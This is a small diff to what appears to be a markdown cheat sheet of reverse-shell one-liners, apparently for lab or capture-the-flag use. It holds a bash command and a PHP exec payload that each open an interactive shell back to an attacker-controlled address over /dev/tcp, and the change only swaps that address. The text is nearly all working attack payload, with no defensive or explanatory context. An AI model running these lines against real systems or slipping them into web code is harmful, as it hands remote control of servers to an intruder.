@@ -13,7 +13,7 @@ bash -c "bash -i >& /dev/tcp/10.8.203.6/9001 0>&1"
 ### Oneliner php
 ```python
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.203.6/7890 0>&1'"):
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'"):
 ```
 
 ### Oneliner php
